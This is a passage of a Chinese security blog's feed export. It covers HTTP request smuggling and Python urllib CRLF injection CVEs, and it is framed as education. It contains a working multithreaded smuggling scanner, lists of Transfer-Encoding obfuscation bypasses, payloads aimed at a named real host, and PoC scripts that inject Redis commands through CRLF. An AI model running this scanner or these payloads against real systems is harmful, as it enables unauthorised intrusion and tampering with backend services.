class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = s.send(prepped, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            resp_time = resp.elapsed.total_seconds()</span><br><span class="line">            <span class="keyword">return</span> resp_time</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> (e)</span><br><span class="line">            resp_time = <span class="number">10</span></span><br><span class="line">            <span class="keyword">if</span> isinstance(e, ReadTimeout):</span><br><span class="line">                print(<span class="string">"requests.exceptions.ReadTimeout"</span>)</span><br><span class="line">                <span class="keyword">return</span> resp_time</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect_TECL</span><span class="params">(self, headers=&#123;&#125;, payload=<span class="string">""</span>)</span>:</span></span><br><span class="line">        s = Session()</span><br><span class="line">        req = Request(<span class="string">'POST'</span>, self.url, data=payload)</span><br><span class="line">        prepped = req.prepare()</span><br><span class="line">        prepped.headers = headers</span><br><span class="line">        resp_time = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = s.send(prepped, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            resp_time = resp.elapsed.total_seconds()</span><br><span class="line">            print(resp, resp_time)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">print</span> (e)</span><br><span class="line">            <span class="keyword">if</span> isinstance(e, ReadTimeout):</span><br><span class="line">                resp_time = <span class="number">10</span></span><br><span class="line">                print(<span class="string">"requests.exceptions.ReadTimeout"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># print(resp_time)</span></span><br><span class="line">        <span class="keyword">return</span> resp_time</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_CLTE</span><span class="params">(self)</span>:</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">        <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">4</span></span><br><span class="line">            payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            t2 = self.detect_CLTE(headers, payload)</span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">11</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            payload = <span class="string">"1\r\nZ\r\nQ\r\n\r\n\r\n"</span></span><br><span class="line">            t1 = self.detect_CLTE(headers, payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> (t1, t2)</span><br><span class="line">            <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                self.valid = <span class="keyword">True</span></span><br><span class="line">                self.type = <span class="string">"CL-TE"</span></span><br><span class="line">                self.headers_payload = [headers]</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_TECL</span><span class="params">(self)</span>:</span></span><br><span class="line">        n = <span class="number">0</span></span><br><span class="line">        payloads = self.payload_headers <span class="keyword">if</span> self.headers_payload == [] <span class="keyword">else</span> self.headers_payload</span><br><span class="line">        <span class="keyword">for</span> headers <span class="keyword">in</span> payloads:</span><br><span class="line">            n = n + <span class="number">1</span></span><br><span class="line">            payload = <span class="string">"0\r\n\r\nX"</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">6</span></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            t2 = self.detect_TECL(headers, payload)</span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> t2 &lt; <span class="number">5</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            print(self.url, headers)</span><br><span class="line">            payload = <span class="string">"0\r\n\r\n"</span></span><br><span class="line">            headers[<span class="string">'Content-Length'</span>] = <span class="number">5</span></span><br><span class="line">            t1 = self.detect_TECL(headers, payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t1 == <span class="keyword">None</span>: t1 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> t2 == <span class="keyword">None</span>: t2 = <span class="number">0</span></span><br><span class="line">            <span class="comment"># print (t1, t2)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> t2 &gt; <span class="number">5</span> <span class="keyword">and</span> t2 / t1 &gt;= <span class="number">5</span>:</span><br><span class="line">                self.valid = <span class="keyword">True</span></span><br><span class="line">                self.type = <span class="string">"TE-CL"</span></span><br><span class="line">                self.headers_payload = [headers]</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            h = &#123;</span><br><span class="line">                <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"</span>&#125;</span><br><span class="line">            requests.get(self.url, headers=h, verify=<span class="keyword">False</span>, timeout=<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check_CLTE():</span><br><span class="line">                self.check_TECL()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            print(<span class="string">"timeout: "</span> + self.url)</span><br><span class="line">        <span class="keyword">return</span> self.recheck()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recheck</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"recheck"</span>)</span><br><span class="line">        print(self.valid, self.type)</span><br><span class="line">        <span class="keyword">if</span> self.valid:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="string">"CL-TE"</span>:</span><br><span class="line">                <span class="keyword">if</span> self.check_CLTE():</span><br><span class="line">                    <span class="keyword">print</span> (<span class="string">"Find CL-TE: "</span> + self.url)</span><br><span class="line">                    payload_key = list(self.headers_payload[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    payload_value = self.headers_payload[<span class="number">0</span>][payload_key]</span><br><span class="line">                    payload = str([payload_key, payload_value])</span><br><span class="line">                    print(payload)</span><br><span class="line">                    fp.write(<span class="string">"CL-TE\t poc:"</span> + payload + <span class="string">"\t"</span> + self.url + <span class="string">"\n"</span>)</span><br><span class="line">                    fp.flush()</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">"CL-TE"</span>, payload]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> self.check_TECL():</span><br><span class="line">                    <span class="keyword">print</span> (<span class="string">"Find TE-CL: "</span> + self.url)</span><br><span class="line">                    payload_key = list(self.headers_payload[<span class="number">0</span>])[<span class="number">0</span>]</span><br><span class="line">                    payload_value = self.headers_payload[<span class="number">0</span>][payload_key]</span><br><span class="line">                    payload = str([payload_key, payload_value])</span><br><span class="line">                    print(payload)</span><br><span class="line">                    fp.write(<span class="string">"TE-CL\t poc:"</span> + payload + <span class="string">"\t"</span> + self.url + <span class="string">"\n"</span>)</span><br><span class="line">                    fp.flush()</span><br><span class="line">                    <span class="keyword">return</span> [<span class="string">"TE-Cl"</span>, payload]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(url)</span>:</span></span><br><span class="line">    a = HTTP_REQUEST_SMUGGLER(url)</span><br><span class="line">    print(a.run())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> threadpool</span><br><span class="line">    iter_list = open(<span class="string">"urls.txt"</span>).read().split(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">    pool = threadpool.ThreadPool(<span class="number">30</span>)</span><br><span class="line">    thread_requests = threadpool.makeRequests(func, iter_list)</span><br><span class="line">    [pool.putRequest(req) <span class="keyword">for</span> req <span class="keyword">in</span> thread_requests]</span><br><span class="line">    pool.wait()</span><br><span class="line"></span><br><span class="line">func(<span class="string">"https://example.com"</span>)</span><br></pre></td></tr></table></figure><h2 id="0x06-Bypass技巧"><a href="#0x06-Bypass技巧" class="headerlink" title="0x06 Bypass技巧"></a>0x06 Bypass技巧</h2><h3 id="混淆TE头"><a href="#混淆TE头" class="headerlink" title="混淆TE头"></a>混淆TE头</h3><p>前面提到了一些混淆TE头的方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>除此之外，更多的一些混淆方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding :chunked</span><br><span class="line">Transfer_Encoding:chunked</span><br><span class="line">Transfer Encoding:chunked</span><br><span class="line"> Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding:  chunked</span><br><span class="line">Transfer-Encoding:chunked</span><br><span class="line">Transfer-Encoding:\tchunked</span><br><span class="line">Transfer-Encoding:\u000Bchunked</span><br><span class="line">Content-Encoding: chunked</span><br><span class="line">Transfer-Encoding:\n chunked</span><br><span class="line">Transfer-Encoding\n : chunked</span><br><span class="line">Transfer-Encoding: \&quot;chunked\&quot;</span><br><span class="line">Transfer-Encoding: &apos;chunked&apos;</span><br><span class="line">Transfer-Encoding: \n\u000Bchunked</span><br><span class="line">Transfer-Encoding: \n\tchunked</span><br><span class="line">Transfer-Encoding: chunked, cow</span><br><span class="line">Transfer-Encoding: cow, </span><br><span class="line">Transfer-Encoding: chunked\r\nTransfer-encoding: cow</span><br><span class="line">Transfer-Encoding: chunk</span><br><span class="line">Transfer-Encoding: cHuNkeD</span><br><span class="line">TrAnSFer-EnCODinG: cHuNkeD</span><br><span class="line">Transfer-Encoding: CHUNKED</span><br><span class="line">TRANSFER-ENCODING: CHUNKED</span><br><span class="line">Transfer-Encoding: chunked\r</span><br><span class="line">Transfer-Encoding: chunked\t</span><br><span class="line">Transfer-Encoding: cow\r\nTransfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: cow\r\nTransfer-Encoding: chunked</span><br><span class="line">Transfer\r-Encoding: chunked</span><br><span class="line">barn\n\nTransfer-Encoding: chunked</span><br></pre></td></tr></table></figure><h3 id="设置X-Forwarded-Proto以解决无法HTTP发送的问题"><a href="#设置X-Forwarded-Proto以解决无法HTTP发送的问题" class="headerlink" title="设置X-Forwarded-Proto以解决无法HTTP发送的问题"></a>设置X-Forwarded-Proto以解决无法HTTP发送的问题</h3><p>原payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1Host: staging-alerts.newrelic.comHTTP/1.1 301 Moved PermanentlyLocation: https://staging-alerts.newrelic.com/</span><br></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsHTTP/1.1 404 Not FoundAction Controller: Exception caught</span><br></pre></td></tr></table></figure><h3 id="设置X-nr-external-service授权标头"><a href="#设置X-nr-external-service授权标头" class="headerlink" title="设置X-nr-external-service授权标头"></a>设置X-nr-external-service授权标头</h3><p>原payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /revision_check HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsHTTP/1.1 200 OKNot authorized with header:</span><br></pre></td></tr></table></figure><p>修改后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...GET /revision_check HTTP/1.1Host: staging-alerts.newrelic.comX-Forwarded-Proto: httpsX-nr-external-service: 1HTTP/1.1 403 ForbiddenForbidden</span><br></pre></td></tr></table></figure><h2 id="0x07-防御方法"><a href="#0x07-防御方法" class="headerlink" title="0x07 防御方法"></a>0x07 防御方法</h2><ul><li>使用HTTP2.0协议，其本身会对请求进行隔离，不存在HRS问题；</li><li>禁止前端服务器与后端服务器之间的TCP连接重用，保证不同用户不会复用同一个TCP连接；</li><li>前后端使用相同的服务器；</li><li>后端服务器需要对所有的请求字段做严格的校验，尤其是需要对备注类的头字段；</li><li>后端服务器需要针对敏感页面开启CSP；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="HRS" scheme="https://www.mi1k7ea.com/tags/HRS/"/>
    
  </entry>
  
  <entry>
    <title>Python urllib CRLF注入漏洞小结</title>
    <link href="https://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/03/09/Python-urllib-CRLF注入漏洞小结/</id>
    <published>2020-03-09T15:05:41.000Z</published>
    <updated>2020-03-10T16:40:10.344Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Python urllib CRLF注入漏洞是很早的东西了，但是19年又新爆出两个CVE，这里就比较下这几个CVE利用注意点及区别吧。</p><h2 id="0x01-CRLF注入漏洞"><a href="#0x01-CRLF注入漏洞" class="headerlink" title="0x01 CRLF注入漏洞"></a>0x01 CRLF注入漏洞</h2><p>CRLF是“回车 + 换行”（\r\n）的简称，十六进制，码为0x0d和0x0a。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。因此，当我们能够控制HTTP消息头中的字符，注入一些恶意的换行比如一些会话Cookie或者HTML代码，这就是CRLF注入。</p><p>具体的可看到wooyun之前的文章：<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p><h2 id="0x02-CVE-2016-5699"><a href="#0x02-CVE-2016-5699" class="headerlink" title="0x02 CVE-2016-5699"></a>0x02 CVE-2016-5699</h2><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 and urllib in CPython (aka Python) before 2.7.10 and 3.x before 3.4.4</p><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080</code></p><p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面：</p><p><code>http://10.10.10.10\r\nx-injected: header\r\ntest:8080</code></p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><p>这部分直接引自参考的文章。</p><p>HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。</p><p>漏洞验证代码如下，fetch3.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>本地开启nc监听端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 12345</span><br></pre></td></tr></table></figure><p>接着，正常运行访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch3.py http://127.0.0.1:12345/foo</span><br></pre></td></tr></table></figure><p>在nc中会接收到如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Connection: close</span><br><span class="line">Host: 127.0.0.1:12345</span><br></pre></td></tr></table></figure><p>现在，我们在IP地址和端口之间的分隔符即<code>:</code>之前进行CRLF注入，尝试注入两个HTTP头字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fetch3.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo</span><br></pre></td></tr></table></figure><p>然后在nc中接收到如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">User-Agent: Python-urllib/3.4</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">X-injected: header</span><br><span class="line">x-leftover: :12345</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>可以看到，请求是正常发送的，并且在Host头字段处获取主机IP地址时成功进行了CRLF注入，即将X-injected和x-leftover这两个头字段都注入了进去。至此，攻击者就可以注入任意的HTTP头字段了。</p><p>另外，在针对的是域名而非IP地址的场景进行利用的时候有个注意点，就是在域名后进行CRLF注入之前要插入一个空字符如<code>%00</code>，这样才能顺利地进行DNS查询。</p><p>比如下面的CRLF注入会URL解析失败：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%0d%0ax-bar:%20:12345/foo</span><br></pre></td></tr></table></figure><p>但是下面的URL是可以正常解析并访问到127.0.0.1的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost%00%0d%0ax-bar:%20:12345/foo</span><br></pre></td></tr></table></figure><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考这篇文章即可：<a href="https://www.cdxy.me/?p=660" target="_blank" rel="noopener">[CVE-2016-5699] Python HTTP header injection in urllib/urllib2</a></p><h2 id="0x03-CVE-2019-9740"><a href="#0x03-CVE-2019-9740" class="headerlink" title="0x03 CVE-2019-9740"></a>0x03 CVE-2019-9740</h2><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p><h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080/test/?test=a</code></p><p>CRLF注入，注入点在IP地址和端口号的分隔符即<code>:</code>前面，但是和前者的区别在于注入新的端口：</p><p><code>http://10.10.10.10:1234?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123:8080/test/?test=a</code></p><h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><p>官网的PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.10.137:7777?a=1 HTTP/1.1\r\nX-injected: header\r\nTEST: 123"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>在Kali开启nc监听7777端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>然后运行PoC脚本后，在Kali端接收到请求，可以看到请求报文中是成功CRLF注入了HTTP头字段的：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/1.png" alt=""></p><p>接着，我们试下攻击Redis，修改PoC脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">host = <span class="string">"192.168.10.137:6379?\r\nSET hacker mi1k7ea\r\n"</span></span><br><span class="line">url = <span class="string">"http://"</span> + host + <span class="string">":8080/test/?test=a"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    info = urllib.request.urlopen(url).info()</span><br><span class="line">    print(info)</span><br><span class="line"><span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>运行脚本，显示报错：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/2.png" alt=""></p><p>虽然报错，但是在Kali中的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/3.png" alt=""></p><h3 id="源码分析-1"><a href="#源码分析-1" class="headerlink" title="源码分析"></a>源码分析</h3><p>参考这篇文章即可：<a href="https://xz.aliyun.com/t/5123" target="_blank" rel="noopener">CVE-2019-9740 Python urllib CRLF injection vulnerability 浅析</a></p><h2 id="0x04-CVE-2019-9947"><a href="#0x04-CVE-2019-9947" class="headerlink" title="0x04 CVE-2019-9947"></a>0x04 CVE-2019-9947</h2><h3 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h3><p>urllib2 in Python 2.x through 2.7.16 and urllib in Python 3.x through 3.7.3</p><h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p>正常访问URL：</p><p><code>http://10.10.10.10:8080</code></p><p>CRLF注入，注入点在端口号后面：</p><p><code>http://10.10.10.10:8080/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</code></p><p><code>http://10.10.10.10:8080/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n</code></p><h3 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h3><p>官网的PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(<span class="string">'http://192.168.10.137:7777/?q=HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n'</span>)</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="comment">#urllib.request.urlopen('http://192.168.10.137:7777/HTTP/1.1\r\nHeader: Value\r\nHeader2: \r\n')</span></span><br></pre></td></tr></table></figure><p>在Kali开启nc监听7777端口：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>然后运行PoC脚本后，在Kali端接收到请求，可以看到两种形式的请求报文中都是成功CRLF注入了HTTP头字段的：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/4.png" alt=""></p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/5.png" alt=""></p><p>接着修改下PoC脚本来打内网Redis：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(<span class="string">'http://192.168.10.137:6379/?q=HTTP/1.1\r\nSET VULN POC\r\nHeader2:\r\n'</span>)</span><br></pre></td></tr></table></figure><p>运行之后虽然报错，但在Kali的Redis中成功创建了新的键值数据，也就是说成功通过Python urllib CRLF注入实现攻击Redis：</p><p><img src="/2020/03/09/Python-urllib-CRLF注入漏洞小结/6.png" alt=""></p><h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="Http-Request-Smuggling"><a href="#Http-Request-Smuggling" class="headerlink" title="Http Request Smuggling"></a>Http Request Smuggling</h3><p>HRS即HTTP请求走私，在2005年的时候已被提出，只是最近圈内比较重视敏感信息泄露这块才被重新关注，可参考：</p><p>比如原始请求如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 